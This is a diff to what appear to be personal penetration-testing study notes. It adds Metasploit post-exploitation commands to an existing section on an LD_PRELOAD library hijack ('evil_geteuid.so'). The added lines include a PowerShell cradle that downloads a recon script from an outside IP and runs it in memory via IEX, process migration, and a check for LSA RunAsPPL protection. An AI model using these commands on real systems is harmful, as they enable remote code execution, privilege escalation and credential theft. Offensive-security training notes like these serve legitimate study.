@@ -52,3 +52,22 @@ gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_PRELOAD.o sharedLibrary_LD_P
 gcc -shared -o sharedLibrary_LD_PRELOAD.so sharedLibrary_LD_PRELOAD.o -ldl
 export LD_PRELOAD=/home/offsec/evil_geteuid.so
 ```
+
+# MSF Console
+
+## Payload Generation
+```bash
+
+```
+
+## Post-exploitation
+```powershell
+execute -H -f notepad
+migrate
+
+##Download Host Recon
+(new-object system.net.webclient).downloadstring('http://192.168.119.120/HostRecon.ps1') | IEX
+
+## Check RunasPPL (If 1 -> Enabled)
+Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
+```
